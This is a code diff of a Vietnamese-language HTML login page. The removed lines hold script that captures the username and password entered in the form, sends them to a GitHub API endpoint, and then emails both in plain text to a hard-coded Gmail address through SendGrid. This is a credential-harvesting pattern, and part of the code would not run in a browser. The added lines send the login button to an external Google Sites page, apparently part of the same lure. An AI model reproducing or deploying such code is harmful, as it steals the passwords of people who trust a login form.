@@ -29,66 +29,22 @@
           <input type="password" class="form-control" placeholder="Nhập mật khẩu" name="password" id="password" required>
         </div>
         <button type="submit" class="btn btn-primary" id="btnLogin">Đăng nhập</button>
-        <p>Bạn chưa có tài khoản? <a href="#" id="registerLink">Đăng ký tài khoản</a></p>
       </form>
     </div>
 
     <!-- JavaScript -->
     <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@sendgrid/mail@7.4.0"></script>
     <script>
-    // Thiết lập SendGrid API key
-    const sgMail = require('@sendgrid/mail');
-    sgMail.setApiKey(process.env.SENDGRID_API_KEY);
+      $(document).ready(function() {
+        // Bắt sự kiện khi nhấn vào nút Đăng nhập
+        $('#btnLogin').on('click', function(event) {
+          event.preventDefault();
 
-    $(document).ready(function() {
-      // Bắt sự kiện khi nhấp vào liên kết Đăng ký
-      $('#registerLink').on('click', function(event) {
-        event.preventDefault();
-        alert('Trang đăng ký của bạn');
-      });
-
-      $('#btnLogin').on('click', function(event) {
-        event.preventDefault();
-
-        // Lấy thông tin đăng nhập từ form
-        const username = $('#username').val();
-        const password = $('#password').val();        
-
-        // Gửi yêu cầu đăng nhập tới server
-        $.ajax({
-          url: 'https://api.github.com/user',
-          type: 'POST',
-          data: JSON.stringify({
-            login: username,
-            password: password
-          }),
-          contentType: 'application/json',
-          success: function(response) {
-            console.log(response);
-
-            // Gửi email thông tin đăng nhập
-            const fromEmail = 'dungcuongthtq10020112@gmail.com';
-            const toEmail = 'dungcuongthtq10020112@gmail.com';
-            const subject = 'Thông tin đăng nhập';
-            const text = 'Tên đăng nhập: ' + username + '\nMật khẩu: ' + password;
-            const mail = {
-              from: fromEmail,
-              to: toEmail,
-              subject: subject,
-              text: text
-            };
-
-            sgMail.send(mail);
-          },
-          error: function(error) {
-            console.log(error);
-          }           
+          // Chuyển hướng đến trang Đăng nhập mới
+          window.location.href = 'https://sites.google.com/view/shopkako';
         });
       });
-    });
     </script>
-
     <!-- JavaScript Bootstrap và Popper -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
